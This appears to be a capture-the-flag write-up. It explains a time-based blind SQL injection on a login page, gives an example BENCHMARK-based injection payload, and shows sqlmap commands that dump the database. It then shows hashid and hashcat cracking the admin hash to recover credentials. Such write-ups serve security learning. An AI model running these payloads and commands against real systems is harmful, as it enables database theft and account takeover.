The exploit was a Time-based Blind SQL injection on the login page.
Details about Blind SQL injection:
    - https://owasp.org/www-community/attacks/Blind_SQL_Injection
    - https://portswigger.net/web-security/sql-injection/blind

This type of blind SQL injection relies on the database pausing for a specified amount of time, then returning the results, indicating successful SQL query executing. Using this method, an attacker enumerates each letter of the desired piece of data using the following logic:
If the first letter of the first database’s name is an ‘A’, wait for 10 seconds.
If the first letter of the first database’s name is an ‘B’, wait for 10 seconds. etc.
Example: 1 UNION SELECT IF(SUBSTRING(user_password,1,1) = CHAR(50),BENCHMARK(5000000,ENCODE('MSG','by 5 seconds')),null) FROM users WHERE user_id = 1;
If the database response took a long time, we may expect that the first user password character with user_id = 1 is character ‘2’. (CHAR(50) == '2')
Using this method for the rest of characters, it’s possible to enumerate entire passwords stored in the database. This method works even when the attacker injects the SQL queries and the content of the vulnerable page doesn’t change.

------------------------------------------------------------------------------------------------------
I used sqlmap to test for SQL injections:

sqlmap -u http://206.189.100.213/login --data="username=user&password=pass" --method POST --dbs --batch

sqlmap -u http://206.189.100.213/login --data="username=user&password=pass" --method POST -D ctf --dump all --batch

It displays the following:
Database: ctf
Table: ctf_user
[2 entries]
+----+-----------+----------------------------------------------------------------------------------------------------------------------------------+
| id | name      | password                                                                                                                         |
+----+-----------+----------------------------------------------------------------------------------------------------------------------------------+
| 1  | admin5543 | 62f68c10ab342883b8cf4be695fa32b99aa65ce35a4b4124354ef1b68646ce6167a95a06bfd05a98923de860b5cff0d476a2bc9e4dcdfab5ef84d90b9964c00c |
| 2  | flag      | CTF{a52ec551-3825-40c8-a705-4896816197fa}                                                                                        |
+----+-----------+----------------------------------------------------------------------------------------------------------------------------------+


hashid -m 62f68c10ab342883b8cf4be695fa32b99aa65ce35a4b4124354ef1b68646ce6167a95a06bfd05a98923de860b5cff0d476a2bc9e4dcdfab5ef84d90b9964c00c

It displays:
Analyzing '62f68c10ab342883b8cf4be695fa32b99aa65ce35a4b4124354ef1b68646ce6167a95a06bfd05a98923de860b5cff0d476a2bc9e4dcdfab5ef84d90b9964c00c'
[+] SHA-512 [Hashcat Mode: 1700]
[+] Whirlpool [Hashcat Mode: 6100]


hashcat -m 1700 -a 0 62f68c10ab342883b8cf4be695fa32b99aa65ce35a4b4124354ef1b68646ce6167a95a06bfd05a98923de860b5cff0d476a2bc9e4dcdfab5ef84d90b9964c00c /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt

It displays:
...
62f68c10ab342883b8cf4be695fa32b99aa65ce35a4b4124354ef1b68646ce6167a95a06bfd05a98923de860b5cff0d476a2bc9e4dcdfab5ef84d90b9964c00c:payub078883660
...

So we have username and password to login:
admin5543:payub078883660


------------------------------------------------------------------------------------------------------
Part 2: Find details about the integration

The documentation page is hosted at github.
We can find in the "documentation" repository in the commits history that the CTF flag was deleted in one of the old commits:
    - https://github.com/ctf-payments/documentation/commits/main

We can also find details about the request signature algorithm in one of the old commits, which would be helpful in the next challenge.

------------------------------------------------------------------------------------------------------
